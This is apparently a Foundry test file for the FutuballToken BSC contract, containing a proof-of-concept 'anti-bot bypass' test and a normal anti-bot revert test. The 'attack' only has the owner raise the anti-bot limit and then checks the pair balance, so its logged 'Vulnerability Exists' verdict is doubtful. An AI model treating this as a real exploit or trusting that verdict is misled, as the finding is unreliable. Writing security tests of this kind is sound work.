// SPDX-License-Identifier: MIT
pragma solidity 0.8.4;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/FutuballToken.sol";

contract MockRouter {
    address public immutable factory;
    address public immutable WETH;

    constructor(address _factory, address _WETH) {
        factory = _factory;
        WETH = _WETH;
    }
}

contract MockFactory {
    function createPair(address, address) external view returns (address) {
        return address(0x1234);
    }
}

contract MockWETH {}

contract FutuballTokenTest is Test {
    FutuballToken token;
    address constant owner = address(0x1);
    address constant user = address(0x2);
    address constant ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    uint256 constant INITIAL_BALANCE = 1000 ether;

    function setUp() public {
        // Mock Pancakeswap dependencies
        address weth = address(new MockWETH());
        address factory = address(new MockFactory());
        vm.etch(ROUTER, address(new MockRouter(factory, weth)).code);

        // Deploy token contract
        vm.prank(owner);
        token = new FutuballToken();
        
        // Setup initial balances
        vm.startPrank(owner);
        token.transfer(user, INITIAL_BALANCE);
        token.excludeFromFee(owner);
        vm.stopPrank();
    }

    function testAntiBotBypass() public {
        // Set block timestamp to prevent underflow
        vm.warp(1000);
        
        address pair = token.pairAddress();
        
        console.log("--- BEFORE-Trigger: Pair balance ---");
        uint256 pairBalanceBefore = token.balanceOf(pair);
        console.log("Pair balance before attack:", pairBalanceBefore);
        
        console.log("--- ATTACK TRIGGERED: Disable anti-bot ---");
        // Owner disables anti-bot protection
        vm.prank(owner);
        token.setAntiBotAmount(type(uint256).max, 100000);
        
        console.log("--- ATTACK TRIGGERED: Transfer to pair ---");
        // User transfers to pair (simulates sell)
        vm.prank(user);
        token.transfer(pair, INITIAL_BALANCE);
        
        console.log("--- AFTER-Trigger: Pair balance ---");
        uint256 pairBalanceAfter = token.balanceOf(pair);
        console.log("Pair balance after attack:", pairBalanceAfter);
        
        uint256 delta = pairBalanceAfter - pairBalanceBefore;
        console.log("Token balance change:", delta);

        // Final vulnerability verification
        if (delta > 0) {
            console.log("Vulnerability Exists: Transfer bypassed antiBot protection");
        } else {
            console.log("Vulnerability not Exist: No state change detected in pair address");
        }
    }

    function testAntiBotProtection() public {
        // Set block timestamp to prevent underflow
        vm.warp(1000);
        
        // Enable anti-bot protection
        vm.prank(owner);
        token.setAntiBotAmount(1 ether, 100000);
        
        // Attempt large transfer to pair should fail
        address pair = token.pairAddress();
        vm.prank(user);
        vm.expectRevert("antiBot");
        token.transfer(pair, INITIAL_BALANCE);
    }
}